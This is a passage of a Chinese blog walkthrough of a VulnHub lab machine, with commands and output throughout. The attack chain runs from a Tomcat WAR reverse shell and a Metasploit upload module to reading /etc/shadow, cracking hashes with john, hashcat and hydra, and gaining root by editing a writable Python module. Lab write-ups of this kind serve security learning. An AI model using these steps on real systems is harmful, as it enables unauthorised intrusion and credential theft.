class="hljs-tag">&lt;<span class="hljs-name">user</span> <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;melehifokivai&quot;</span> <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;admin-gui, manager-gui&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">tomcat-users</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><h3 id="M1、Upload"><a href="#M1、Upload" class="headerlink" title="M1、Upload"></a>M1、Upload</h3><p>在 <code>http://192.168.135.150:8080/manager/html</code> 中发现一个可以上传 war 文件的地方，尝试上传木马。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.135.141 LPORT=4444 -f war &gt; shell.war</span><br></code></pre></td></tr></table></figure><p>使用 admin 上传失败：</p><blockquote><p>后来再次使用 admin 上传居然成功了，不知道什么原因</p></blockquote><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs vhdl"><span class="hljs-number">403</span> <span class="hljs-keyword">Access</span> Denied<br>You are <span class="hljs-keyword">not</span> authorized <span class="hljs-keyword">to</span> <span class="hljs-keyword">view</span> this page.<br><br>By <span class="hljs-keyword">default</span> the Manager <span class="hljs-keyword">is</span> only accessible from a browser running <span class="hljs-keyword">on</span> the same machine as Tomcat. <span class="hljs-keyword">If</span> you wish <span class="hljs-keyword">to</span> modify this restriction, you<span class="hljs-symbol">&#x27;ll</span> need <span class="hljs-keyword">to</span> edit the Manager<span class="hljs-symbol">&#x27;s</span> <span class="hljs-keyword">context</span>.xml <span class="hljs-keyword">file</span>.<br><br>[......]<br><br><span class="hljs-keyword">If</span> you have <span class="hljs-keyword">not</span> changed any <span class="hljs-keyword">configuration</span> files, please examine the <span class="hljs-keyword">file</span> conf/tomcat-users.xml <span class="hljs-keyword">in</span> your installation. That <span class="hljs-keyword">file</span> must contain the credentials <span class="hljs-keyword">to</span> let you <span class="hljs-keyword">use</span> this webapp.<br><br><span class="hljs-keyword">For</span> example, <span class="hljs-keyword">to</span> add the manager-gui role <span class="hljs-keyword">to</span> a user named tomcat <span class="hljs-keyword">with</span> a password <span class="hljs-keyword">of</span> s3cret, add the following <span class="hljs-keyword">to</span> the config <span class="hljs-keyword">file</span> listed above.<br><br>&lt;role rolename=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;<br>&lt;user username=<span class="hljs-string">&quot;tomcat&quot;</span> password=<span class="hljs-string">&quot;s3cret&quot;</span> roles=<span class="hljs-string">&quot;manager-gui&quot;</span>/&gt;<br><br>[......]<br></code></pre></td></tr></table></figure><p>使用 manager 尝试，成功上传，访问出现 404 ，将文件名字修改为 wzz.war，成功上传并访问 。</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">HTTP Status <span class="hljs-number">404</span> – <span class="hljs-keyword">Not</span> <span class="hljs-built_in">Found</span><br><span class="hljs-keyword">Type</span> Status Report<br><br>Message JSP file [/ozmptmhkzfd.jsp] <span class="hljs-keyword">not</span> <span class="hljs-built_in">found</span><br><br>Description The origin <span class="hljs-keyword">server</span> did <span class="hljs-keyword">not</span> find a <span class="hljs-keyword">current</span> representation <span class="hljs-keyword">for</span> the target resource <span class="hljs-keyword">or</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> willing <span class="hljs-keyword">to</span> disclose that one <span class="hljs-keyword">exists</span>.<br><br>Apache Tomcat/<span class="hljs-number">9.0</span><span class="hljs-number">.53</span><br></code></pre></td></tr></table></figure><p>监听，访问 <code>http://192.168.135.150:8080/wzz/</code> ，成功反弹：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 4444</span>            <br>listening on [any] 4444 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.150] 52036<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>tomcat<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)<br></code></pre></td></tr></table></figure><p>查看 <code>/etc/passwd</code> ，得到另外两个用户：<code>jaye</code> 和 <code>randy</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>[......]<br>randy:x:1000:1000:randy,,,:/home/randy:/bin/bash<br>tomcat:x:1001:1001::/home/tomcat:/bin/sh<br>jaye:x:1002:1002::/home/jaye:/bin/sh<br></code></pre></td></tr></table></figure><p>查看文件，得到 flag 和提示：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ls /home</span><br>jaye<br>randy<br><span class="hljs-meta">$</span><span class="bash"> ls /home/jaye</span><br><span class="hljs-meta">$</span><span class="bash"> ls /home/randy</span><br>Desktop<br>Documents<br>Downloads<br>Music<br>note.txt<br>Pictures<br>Public<br>randombase64.py<br>Templates<br>user.txt<br>Videos<br><span class="hljs-meta">$</span><span class="bash"> cat /home/randy/user.txt</span><br>ca73a018ae6908a7d0ea5d1c269ba4b6<br><span class="hljs-meta">$</span><span class="bash"> cat /home/randy/note.txt</span><br>Hey randy this is your system administrator, hope your having a great day! I just wanted to let you know<br>that I changed your permissions for your home directory. You won&#x27;t be able to remove or add files for now.<br>I will change these permissions later on.<br>See you next Monday randy!<br></code></pre></td></tr></table></figure><h3 id="M2、MSF"><a href="#M2、MSF" class="headerlink" title="M2、MSF"></a>M2、MSF</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs shell">msf6 &gt; use exploit/multi/http/tomcat_mgr_upload<br>[*] No payload configured, defaulting to java/meterpreter/reverse_tcp<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; show options<br><br>Module options (exploit/multi/http/tomcat_mgr_upload):<br><br>   Name          Current Setting  Required  Description<br>   ----          ---------------  --------  -----------<br>   HttpPassword                   no        The password for the specified username<br>   HttpUsername                   no        The username to authenticate as<br>   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]<br>   RHOSTS                         yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit<br>   RPORT         80               yes       The target port (TCP)<br>   SSL           false            no        Negotiate SSL/TLS for outgoing connections<br>   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)<br>   VHOST                          no        HTTP server virtual host<br><br><br>Payload options (java/meterpreter/reverse_tcp):<br><br>   Name   Current Setting  Required  Description<br>   ----   ---------------  --------  -----------<br>   LHOST  192.168.135.141  yes       The listen address (an interface may be specified)<br>   LPORT  4444             yes       The listen port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Java Universal<br><br><br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set RHOST 192.168.135.150<br>RHOST =&gt; 192.168.135.150<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set RPORT 8080<br>RPORT =&gt; 8080<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set HttpUsername manager<br>HttpUsername =&gt; manager<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set HttpPassword melehifokivai<br>HttpPassword =&gt; melehifokivai<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; run<br><br>[-] Exploit aborted due to failure: not-found: The target server fingerprint &quot;&quot; does not match &quot;(?-mix:Apache.*(Coyote|Tomcat))&quot;, use &#x27;set FingerprintCheck false&#x27; to disable this check.<br>[*] Exploit completed, but no session was created.<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; set FingerprintCheck false<br>FingerprintCheck =&gt; false<br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br>[*] Retrieving session ID and CSRF token...<br>[*] Uploading and deploying kzjgLzmgvwvJfA8VstCGx538xC...<br>[*] Executing kzjgLzmgvwvJfA8VstCGx538xC...<br>[*] Undeploying kzjgLzmgvwvJfA8VstCGx538xC ...<br>[*] Exploit completed, but no session was created.<br><br>msf6 exploit(multi/http/tomcat_mgr_upload) &gt; run<br><br>[*] Started reverse TCP handler on 192.168.135.141:4444 <br>[*] Retrieving session ID and CSRF token...<br>[*] Uploading and deploying pMSae7Hpx3qAH7v9lPM...<br>[*] Executing pMSae7Hpx3qAH7v9lPM...<br>[*] Undeploying pMSae7Hpx3qAH7v9lPM ...<br>[*] Sending stage (58060 bytes) to 192.168.135.150<br>[*] Meterpreter session 1 opened (192.168.135.141:4444 -&gt; 192.168.135.150:52254) at 2022-07-01 02:11:13 -0400<br><br>meterpreter &gt; shell<br>Process 1 created.<br>Channel 1 created.<br>python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;<br>/bin/sh: 1: python: not found<br>exit<br>meterpreter &gt; cat /etc/passwd<br>root:x:0:0:root:/root:/bin/bash<br>[......]<br>randy:x:1000:1000:randy,,,:/home/randy:/bin/bash<br>tomcat:x:1001:1001::/home/tomcat:/bin/sh<br>jaye:x:1002:1002::/home/jaye:/bin/sh<br>meterpreter &gt; cat /etc/shadow<br>[-] core_channel_open: Operation failed: 1<br></code></pre></td></tr></table></figure><h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>用拿到的用户和密码进行撞库，成功拿到 jaye 用户权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh tomcat@192.168.135.150</span><br>tomcat@192.168.135.150&#x27;s password: <br>Permission denied, please try again. <br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ssh randy@192.168.135.150</span><br>randy@192.168.135.150&#x27;s password: <br>Permission denied, please try again.<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ssh jaye@192.168.135.150</span><br>jaye@192.168.135.150&#x27;s password: <br>Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.11.0-34-generic x86_64)<br><br> * Documentation:  https://help.ubuntu.com<br> * Management:     https://landscape.canonical.com<br> * Support:        https://ubuntu.com/advantage<br><br>19 updates can be applied immediately.<br>To see these additional updates run: apt list --upgradable<br><br>The list of available updates is more than a week old.<br>To check for new updates run: sudo apt update<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>jaye<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>uid=1002(jaye) gid=1002(jaye) groups=1002(jaye)<br><span class="hljs-meta">$</span><span class="bash"> sudo -l</span><br>[sudo] password for jaye: <br>Sorry, user jaye may not run sudo on corrosion.<br><span class="hljs-meta">$</span><span class="bash"> ls /home</span><br>jaye  randy<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/home/jaye<br><span class="hljs-meta">$</span><span class="bash"> ls</span> <br>Desktop  Documents  Downloads  Files  Music  Pictures  Public  snap  Templates  Videos<br><span class="hljs-meta">$</span><span class="bash"> ls Files</span><br>look<br><span class="hljs-meta">$</span><span class="bash"> ls -al Files/look</span><br>---s--s--x 1 root root 14728 Sep 17  2021 Files/look<br></code></pre></td></tr></table></figure><p>在其 <code>Files</code> 目录下找到一个 <code>look</code> ，可以实现越权访问：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./Files/look <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-string">&quot;/etc/shadow&quot;</span></span><br>[......]<br>randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::<br>tomcat:$6$XD2Bs.tL01.5OT2b$.uXUR3ysfujHGaz1YKj1l9XUOMhHcKDPXYLTexsWbDWqIO9ML40CQZPI04ebbYzVNBFmgv3Mpd3.8znPf<br>jaye:$6$Chqrqtd4U/B1J3gV$YjeAWKM.usyi/JxpfwYA6ybW/szqkiI1kerC4/JJNMpDUYKavQbnZeUh4WL/fB/4vrzX0LvKVWu60dq4SOQZB0:18887:0:99999:7:::<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ./Files/look <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-string">&quot;/root/root.txt&quot;</span></span><br>2fdbf8d4f894292361d6c72c8e833a4b<br></code></pre></td></tr></table></figure><p>得到 randy 的盐值，使用 john 进行爆破：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::&#x27;</span> &gt; passwd.txt</span><br>                                                                                                           <br><span class="hljs-meta">$</span><span class="bash"> cat passwd.txt</span>                                             <br>randy:$6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:18888:0:99999:7:::<br>                                                                                                           <br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt passwd.txt</span><br>Using default input encoding: UTF-8<br>Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])<br>Cost 1 (iteration count) is 5000 for all loaded hashes<br>Will run 4 OpenMP threads<br>Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status<br>07051986randy    (randy)<br>1g 0:02:22:45 DONE (2022-07-01 03:45) 0.000116g/s 1626p/s 1626c/s 1626C/s 070552898..070511513<br>Use the &quot;--show&quot; option to display all of the cracked passwords reliably<br>Session completed<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> hashcat -m 1800 -a 0 -o found.txt passwd.txt /usr/share/wordlists/rockyou.txt</span>  <br>Session..........: hashcat<br>Status...........: Cracked<br>Hash.Name........: sha512crypt $6$, SHA512 (Unix)<br>Hash.Target......: $6$bQ8rY/73PoUA4lFX$i/aKxdkuh5hF8D78k50BZ4eInDWklwQ...FHJGY/<br>Time.Started.....: Fri Jul  1 08:53:00 2022 (13 hours, 26 mins)<br>Time.Estimated...: Fri Jul  1 22:19:44 2022 (0 secs)<br>Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)<br>Guess.Queue......: 1/1 (100.00%)<br>Speed.#1.........:      905 H/s (17.38ms) @ Accel:32 Loops:512 Thr:1 Vec:4<br>Recovered........: 1/1 (100.00%) Digests<br>Progress.........: 13932928/14344385 (97.13%)<br>Rejected.........: 0/13932928 (0.00%)<br>Restore.Point....: 13932800/14344385 (97.13%)<br>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4608-5000<br>Candidates.#1....: 070541 -&gt; 070519851<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat found.txt</span><br><span class="hljs-meta">$</span><span class="bash">6<span class="hljs-variable">$bQ8rY</span>/73PoUA4lFX<span class="hljs-variable">$i</span>/aKxdkuh5hF8D78k50BZ4eInDWklwQgmmpakv/gsuzTodngjB340R1wXQ8qWhY2cyMwi.61HJ36qXGvFHJGY/:07051986randy</span><br></code></pre></td></tr></table></figure><p>或者直接使用 hydra 进行 SSH 爆破 。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> hydra -l randy -P /usr/share/wordlists/rockyou.txt 192.168.135.150 ssh</span>  <br></code></pre></td></tr></table></figure><h3 id="M1、Sudo"><a href="#M1、Sudo" class="headerlink" title="M1、Sudo"></a>M1、Sudo</h3><p>使用 SSH 登录，查看权限：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ssh randy@192.168.135.150</span> <br>randy@192.168.135.150&#x27;s password: <br><br>randy@corrosion:~$ whoami<br>randy<br>randy@corrosion:~$ id<br>uid=1000(randy) gid=1000(randy) groups=1000(randy),27(sudo)<br>randy@corrosion:~$ sudo -l<br>[sudo] password for randy: <br>Matching Defaults entries for randy on corrosion:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br><br>User randy may run the following commands on corrosion:<br>    (root) PASSWD: /usr/bin/python3.8 /home/randy/randombase64.py<br></code></pre></td></tr></table></figure><p>可以运行一个文件，查看该文件权限，发现不能更改该文件，查看其内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~$ pwd<br>/home/randy<br>randy@corrosion:~$ ls -l /home/randy/randombase64.py<br>-rwxr-xr-x 1 root root 210 Sep 20  2021 /home/randy/randombase64.py<br>randy@corrosion:~$ cat /home/randy/randombase64.py<br>import base64<br><br>message = input(&quot;Enter your string: &quot;)<br>message_bytes = message.encode(&#x27;ascii&#x27;)<br>base64_bytes = base64.b64encode(message_bytes)<br>base64_message = base64_bytes.decode(&#x27;ascii&#x27;)<br><br>print(base64_message)<br></code></pre></td></tr></table></figure><p>用了 base64 模块，找到 base64 脚本，查看该文件权限，发现可以修改：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~$ find / -name base64.py  2&gt;/dev/null<br>/snap/core18/2128/usr/lib/python3.6/base64.py<br>/snap/core18/2409/usr/lib/python3.6/base64.py<br>/snap/core20/1518/usr/lib/python3.8/base64.py<br>/snap/gnome-3-34-1804/77/usr/lib/python2.7/base64.py<br>/snap/gnome-3-34-1804/77/usr/lib/python3.6/base64.py<br>/snap/gnome-3-34-1804/72/usr/lib/python2.7/base64.py<br>/snap/gnome-3-34-1804/72/usr/lib/python3.6/base64.py<br>/usr/lib/python3.8/base64.py<br>randy@corrosion:~$ ls -l /usr/lib/python3.8/base64.py<br>-rwxrwxrwx 1 root root 20386 Sep 20  2021 /usr/lib/python3.8/base64.py<br></code></pre></td></tr></table></figure><p>直接在 base64 模块里面写入调用 shell 的语句，使用 os 模块调用 shell ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~$ vi /usr/lib/python3.8/base64.py<br><span class="hljs-meta">#</span><span class="bash"> import os</span><br><span class="hljs-meta">#</span><span class="bash"> os.system(<span class="hljs-string">&quot;/bin/bash&quot;</span>)</span><br></code></pre></td></tr></table></figure><p>运行 randombase64.py 文件，成功得到 root 权限，查看 flag：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell">randy@corrosion:~$ sudo /usr/bin/python3.8 /home/randy/randombase64.py<br>[sudo] password for randy: <br>root@corrosion:/home/randy# whoami<br>root<br>root@corrosion:/home/randy# id<br>uid=0(root) gid=0(root) groups=0(root)<br>root@corrosion:/home/randy# ls /root<br>root.txt  snap<br>root@corrosion:/home/randy# cat /root/root.txt<br>2fdbf8d4f894292361d6c72c8e833a4b<br></code></pre></td></tr></table></figure><h3 id="M2、SUID"><a href="#M2、SUID" class="headerlink" title="M2、SUID"></a>M2、SUID</h3><p>找到 <code>/usr/bin/pkexec</code> ，可以使用 <code>CVE-2021-4034</code> 通杀漏洞进行提权：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span><br>[.......]<br>/usr/bin/pkexec<br>/usr/sbin/pppd<br>[.......]<br></code></pre></td></tr></table></figure><h2 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h2><p>1、目录扫描：dirsearch、nikto、dirb（加参数 -X ：扫描特定后缀的文件）</p><p>2、备份文件：配置文件泄露</p><p>3、zip文件破解：zip2john + john，fcrackzip</p><p>4、tomcat：msf、upload war</p><p>5、撞库：SSH</p><p>6、look：越权访问</p><p>7、爆破：hash john/hashcat、ssh hydra</p><p>8、提权：sudo、CVE-2021-4034</p><h2 id="五、其他"><a href="#五、其他" class="headerlink" title="五、其他"></a>五、其他</h2><p><strong>unshadow 命令：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> unshadow passwd shadow &gt; password.txt</span><br><span class="hljs-meta">$</span><span class="bash"> john --wordlist=/usr/share/wordlists/rockyou.txt password.txt</span><br></code></pre></td></tr></table></figure><p> 将这两个文件生成需要破解的文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> shadow</span> <br>kali:$y$j9T$B4i9oW2LaERt/J5/X8bbN/$zzGfRqAZim/VofZcas3MhnfSdYddB5.zRulk087PN2A:18878:0:99999:7:::<br><span class="hljs-meta">#</span><span class="bash"> passwd</span> <br>kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh<br><span class="hljs-meta">#</span><span class="bash"> password.txt</span><br>kali:$y$j9T$B4i9oW2LaERt/J5/X8bbN/$zzGfRqAZim/VofZcas3MhnfSdYddB5.zRulk087PN2A:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Penetration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Penetration</tag>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DC：2</title>
    <link href="/2022/06/27/Penetration/Vulnhub/Part-1/0x05%20DC-2/"/>
    <url>/2022/06/27/Penetration/Vulnhub/Part-1/0x05%20DC-2/</url>
    
